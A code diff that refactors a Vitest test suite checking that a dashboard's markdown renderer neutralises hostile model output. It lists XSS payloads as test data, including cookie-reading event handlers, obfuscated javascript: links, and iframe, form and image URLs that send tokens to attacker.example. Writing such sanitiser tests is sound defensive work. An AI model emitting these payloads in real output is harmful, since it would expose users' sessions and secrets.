@@ -1,4 +1,7 @@
-// @vitest-environment jsdom
+/**
+ * @fileoverview How model output and documents render as markup.
+ * @vitest-environment jsdom
+ */
 import { describe, expect, it } from "vitest";
 import {
 	createIncrementalMarkdown,
@@ -72,38 +75,39 @@ function expectHarmless(...fragments: DocumentFragment[]): void {
 	}
 }
 
-describe("model output renders as inert markup", () => {
-	const injections: Record<string, string> = {
-		"a raw script": "<script>fetch('/api/_auth/session')</script>",
-		"an image with an error handler":
-			'<img src=x onerror="alert(document.cookie)">',
-		"an svg with a load handler": "<svg onload=alert(1)><circle/></svg>",
-		"an iframe": '<iframe src="https://attacker.example"></iframe>',
-		"a style block dressing up the page":
-			"<style>body{position:fixed;inset:0;background:red}</style>",
-		"a form": '<form action="https://attacker.example"><input name=q></form>',
-		"a details toggle": "<details open ontoggle=alert(1)>x</details>",
-		"a javascript link": "[click](javascript:alert(document.cookie))",
-		"a mixed-case javascript link": "[click](JaVaScRiPt:alert(1))",
-		"an entity-encoded javascript link": "[click](&#106;avascript:alert(1))",
-		"a tab-split javascript link": "[click](java\tscript:alert(1))",
-		"a vbscript link": "[click](vbscript:msgbox(1))",
-		"a data: html link":
-			"[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
-		"a javascript autolink": "<javascript:alert(1)>",
-		"a javascript reference link": "[click][x]\n\n[x]: javascript:alert(1)",
-		"a title breaking out of its attribute":
-			'[a](https://example.com "x\\" onmouseover=\\"alert(1)")',
-		"a raw anchor": '<a href="javascript:alert(1)">x</a>',
-		"a fenced code language dressing the block": "```fixed inset-0\ncode\n```",
-		"a remote markdown image":
-			"![secret](https://attacker.example/leak.png?token=SECRET)",
-		"a relative markdown image": "![events](/ai/channel/events)",
-		"a data image": "![x](data:image/png;base64,iVBORw0KGgo=)",
-		"a table alignment": "| a |\n|:-:|\n| b |",
-	};
+/** What a model may write to run code or fetch something from the dashboard. */
+const INJECTIONS = {
+	"a raw script": "<script>fetch('/api/_auth/session')</script>",
+	"an image with an error handler":
+		'<img src=x onerror="alert(document.cookie)">',
+	"an svg with a load handler": "<svg onload=alert(1)><circle/></svg>",
+	"an iframe": '<iframe src="https://attacker.example"></iframe>',
+	"a style block dressing up the page":
+		"<style>body{position:fixed;inset:0;background:red}</style>",
+	"a form": '<form action="https://attacker.example"><input name=q></form>',
+	"a details toggle": "<details open ontoggle=alert(1)>x</details>",
+	"a javascript link": "[click](javascript:alert(document.cookie))",
+	"a mixed-case javascript link": "[click](JaVaScRiPt:alert(1))",
+	"an entity-encoded javascript link": "[click](&#106;avascript:alert(1))",
+	"a tab-split javascript link": "[click](java\tscript:alert(1))",
+	"a vbscript link": "[click](vbscript:msgbox(1))",
+	"a data: html link":
+		"[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
+	"a javascript autolink": "<javascript:alert(1)>",
+	"a javascript reference link": "[click][x]\n\n[x]: javascript:alert(1)",
+	"a title breaking out of its attribute":
+		'[a](https://example.com "x\\" onmouseover=\\"alert(1)")',
+	"a raw anchor": '<a href="javascript:alert(1)">x</a>',
+	"a fenced code language dressing the block": "```fixed inset-0\ncode\n```",
+	"a remote markdown image":
+		"![secret](https://attacker.example/leak.png?token=SECRET)",
+	"a relative markdown image": "![events](/ai/channel/events)",
+	"a data image": "![x](data:image/png;base64,iVBORw0KGgo=)",
+	"a table alignment": "| a |\n|:-:|\n| b |",
+} satisfies Record<string, string>;
 
-	for (const [name, source] of Object.entries(injections)) {
+describe("model output renders as inert markup", () => {
+	for (const [name, source] of Object.entries(INJECTIONS)) {
 		it(`neutralises ${name}`, () => {
 			expectHarmless(renderMarkdown(source));
 		});
@@ -317,7 +321,6 @@ describe("a document reflows its hard-wrapped lines", () => {
 	it("joins a paragraph's lines with spaces, not line breaks", () => {
 		const host = renderSkill();
 		expect(host.querySelector("br")).toBeNull();
-		// A soft break stays a newline in the text, which HTML shows as a space.
 		const text = host.querySelector("p")?.textContent?.replace(/\s+/g, " ");
 		expect(text).toBe(
 			"The DMS is a backend-driven admin framework built on AntelopeJS. You add an admin screen by writing TypeScript.",
